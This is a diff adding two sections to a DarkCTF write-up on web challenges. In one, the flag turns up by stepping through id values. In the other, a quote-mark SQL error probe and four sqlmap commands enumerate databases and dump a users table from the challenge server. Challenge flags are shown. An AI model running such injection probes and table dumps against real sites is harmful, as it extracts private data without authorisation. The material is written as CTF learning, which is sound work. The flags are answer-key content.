@@ -101,15 +101,50 @@ after URL Decoding;
 
 Then I used cyberchef to decode from decimal to ascii
 ![](img/apache_logs02.png)
-Thanks @ysf for the recipe
 
 **Flag: DarkCTF{5ql_1nj3ct10n}**
 
 
 ### Simple_SQL
+![](img/simple_sql00.png)
+
+I visted the website and from the source code they mentioned to use 'Try id as parameter':
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<title>Simple SQL</title>
+<style>
+</style>
+</head>
+<body bgcolor=black>
+<center><font color=red class=title>Welcome Players To My Safe House </font></center> <br>
+<br><!-- Try id as parameter  --> 
+</body>
+</html>
+```
+Let's start from 1
+![](img/simple_sql01.png)
+
+from the 9th entry we got the flag
+![](img/simple_sql.png)
+**Flag: darkCTF{it_is_very_easy_to_find}**
 
 ### So_Simple
-
+![](img/so_simple.png)
+Like previous challenge they gave a clue 'Try id as parameter'.
+Okay, i was able to produce a sql error in /?id='
+Lets try with SQLi. They mentioned You may get flag manually. I was lazy and I used SQLMap.
+Here is the commands I used:
+```shell
+sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --dbs
+sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --tables -D id14831952_security
+sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --columns -D id14831952_security -T users
+sqlmap -u http://web.darkarmy.xyz:30001/?id=8 --dump -D id14831952_security -T users
+```
+we got the flag from users table
+![](img/so_simple01.png)
+**Flag:darkCTF{uniqu3_ide4_t0_find_fl4g}**
 
 ## Forensics
 ### Wolfie's Contact
